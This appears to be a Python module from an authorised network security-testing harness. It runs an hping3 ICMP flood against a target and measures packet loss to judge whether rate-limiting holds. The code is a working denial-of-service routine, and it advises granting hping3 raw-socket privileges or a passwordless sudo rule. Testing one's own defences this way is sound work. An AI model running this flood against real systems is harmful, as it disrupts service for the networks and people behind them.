"""ICMP Flood (DoS). Tests rate-limit / DoS protection.

Matches the manual test script: hping3 ICMP echo flood run in the
background while packet loss is sampled via a 15-count ping.

Requires root (hping3) on Kali. DoS is a weaker control for SD-WAN
(rate-limiting is not its strength) — read results with that in mind, and
only run inside an authorised maintenance window.
"""
import re
import subprocess

FLOOD_SECONDS = 12   # matches the manual script's `timeout 12 hping3`
PING_COUNT = 15
LOSS_THRESHOLD = 30  # % packet loss considered a real DoS impact

META = {
    "id": "icmp_flood",
    "name": "ICMP Flood (DoS)",
    "category": "Network Exploitation",
    "test_type": "dos",
    "control": "Rate-limit / DoS protection",
    "fix": "SD-WAN",
    "mitre": ['T1498.001'],
    "cwe": ['CWE-400'],
    "tactic": 'Impact',
    "requires": ["hping3", "ping", "timeout"],
    "needs_root": True,   # hping3 needs a raw socket (root or CAP_NET_RAW)
    "serial": True,       # DoS: must run alone (don't overlap other tests)
    "os_supported": ["Linux"],   # uses `timeout` + `ping -c` + hping3 (Linux-only)
    "ports": [("icmp", None)],   # ICMP, not a TCP/UDP port
    # attack 'worked' = meaningful packet loss during the flood
    "success_regex": r"PASS",
    # deliberately does NOT match FLOOD-PRIV-ERROR — a privilege failure means
    # the flood never ran at all, which must NOT read as "control held".
    "blocked_regex": r"^INFO|INCONCLUSIVE",
}

# hping3 needs a raw socket (root, or CAP_NET_RAW via setcap) — without it,
# it exits almost instantly and the "flood" never sends a single packet,
# which used to silently show up as 0% loss -> "control held" (false
# negative). Grant the capability once: sudo setcap cap_net_raw,cap_net_admin+eip $(which hping3)
_PRIV_ERR_MARKERS = ("operation not permitted", "raw socket", "permission denied",
                     "a password is required", "a terminal is required", "sudo:")


def run(target, ctx):
    out = [f"# ICMP flood DoS vs {target}  ({FLOOD_SECONDS}s flood, "
           f"{PING_COUNT}-count loss sample)"]

    # Elevate hping3 itself (not `timeout`) via `sudo -n` when we're not root, so
    # a per-command NOPASSWD rule for hping3 matches and sudo never prompts.
    import core
    flood_cmd = ["timeout", str(FLOOD_SECONDS)] + core.sudo_prefix() + \
                ["hping3", "-1", "--flood", target]
    flood = None
    try:
        flood = subprocess.Popen(
            flood_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except FileNotFoundError:
        return "\n".join(out) + "\n[ERROR] hping3 not found (sudo apt install hping3). INCONCLUSIVE"

    try:
        ping = subprocess.run(
            ["ping", "-c", str(PING_COUNT), target],
            capture_output=True, text=True, timeout=PING_COUNT + 10)
        out.append(ping.stdout)
    finally:
        try:
            flood_out, _ = flood.communicate(timeout=FLOOD_SECONDS + 5)
        except Exception:
            flood.kill()
            flood_out, _ = flood.communicate()

    if flood_out and any(m in flood_out.lower() for m in _PRIV_ERR_MARKERS):
        out.append(f"hping3 output: {flood_out.strip()}")
        out.append(
            "FLOOD-PRIV-ERROR: hping3 could not run with the privileges it needs "
            "— the flood never ran. This is NOT evidence the control works. Fix "
            "any ONE of: (a) grant the capability once: sudo setcap "
            "cap_net_raw,cap_net_admin+eip $(which hping3); (b) add a NOPASSWD "
            "sudoers rule for hping3 (the module runs it via `sudo -n hping3`); "
            "or (c) run the harness as root.")
        return "\n".join(out)

    # modern iputils prints a fractional percentage (e.g. "73.3333%"), not
    # just "73%" — \d+ alone would silently grab only the trailing digits
    # after the decimal point (a bogus "3333%").
    m = re.search(r"(\d+(?:\.\d+)?)% packet loss", ping.stdout)
    loss = float(m.group(1)) if m else None

    if loss is None:
        out.append("INCONCLUSIVE: could not parse packet loss from ping output")
    elif loss > LOSS_THRESHOLD:
        out.append(f"PASS: DoS effective - {loss:.1f}% loss")
    else:
        out.append(f"INFO: {loss:.1f}% loss (below {LOSS_THRESHOLD}% threshold — control likely held)")
    return "\n".join(out)
